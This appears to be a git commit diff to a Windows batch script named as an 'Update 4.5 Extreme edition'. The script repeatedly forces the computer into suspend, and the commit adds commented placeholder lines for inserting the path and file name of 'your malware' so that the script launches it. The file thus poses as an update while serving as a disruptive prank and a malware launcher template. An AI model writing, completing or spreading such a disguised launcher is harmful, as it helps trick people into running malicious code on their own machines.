026fce2949b1637ea939b72436cb57606205710d
Damien <60195761+Damien-code@users.noreply.github.com>
2022-02-04 17:28:13 +0100

    Update Update4.5_Extreme_edition.bat

--- Update4.5_Extreme_edition.bat
+++ Update4.5_Extreme_edition.bat
@@ -9,5 +9,7 @@ timeout /t 5
 shutdown /a
 timeout /t 3
 %windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
+:: cd put here the path to your folder that contains the malware and remove the ":: "
+:: start put here the name of your malware and add the name of the file extension and remove the ":: "
 %windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
 %windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
